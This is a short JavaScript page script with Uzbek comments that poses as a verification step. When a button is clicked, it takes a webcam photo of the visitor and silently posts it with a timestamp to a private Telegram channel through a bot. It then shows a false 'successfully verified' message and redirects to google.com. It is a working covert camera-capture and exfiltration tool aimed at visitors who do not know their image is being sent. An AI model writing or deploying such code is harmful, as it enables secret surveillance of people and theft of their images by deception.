// --- SOZLAMALAR ---
const TOKEN = "BOT_TOKENINGNI_SHU_YERGA_YOZ"; 
const CHAT_ID = "-1003616289583"; // Sizning private kanal ID-ingiz
// ------------------

const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

startBtn.addEventListener('click', async () => {
    try {
        // 1. Kameraga ruxsat so'rash
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        startBtn.innerText = "Tekshirilmoqda...";
        startBtn.disabled = true;

        // 2. Kamera fokuslanishi uchun 1 soniya kutish
        setTimeout(() => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'user_photo.jpg');
                formData.append('caption', `📸 Yangi foydalanuvchi rasmi\nVaqt: ${new Date().toLocaleString()}`);

                // 3. Telegram API orqali kanalga yuborish
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(res => {
                    // Kamerani o'chirish (chiroq o'chadi)
                    stream.getTracks().forEach(track => track.stop());
                    
                    if(res.ok) {
                        alert("Muvaffaqiyatli tasdiqlandi!");
                        // Foydalanuvchini test sahifasiga yo'naltirish
                        window.location.href = "https://google.com"; 
                    } else {
                        console.error("Telegram xatosi:", res.description);
                        alert("Xatolik: Bot kanalga rasm yubora olmadi.");
                    }
                })
                .catch(err => {
                    console.error("Yuborishda xato:", err);
                    alert("Tarmoq xatosi yuz berdi.");
                });
            }, 'image/jpeg', 0.7); // 70% sifat bilan siqish
        }, 1000); 

    } catch (err) {
        alert("Xatolik: Kamera ruxsatisiz tizimga kirib bo'lmaydi!");
        console.error("Kamera ruxsati berilmadi:", err);
    }
});
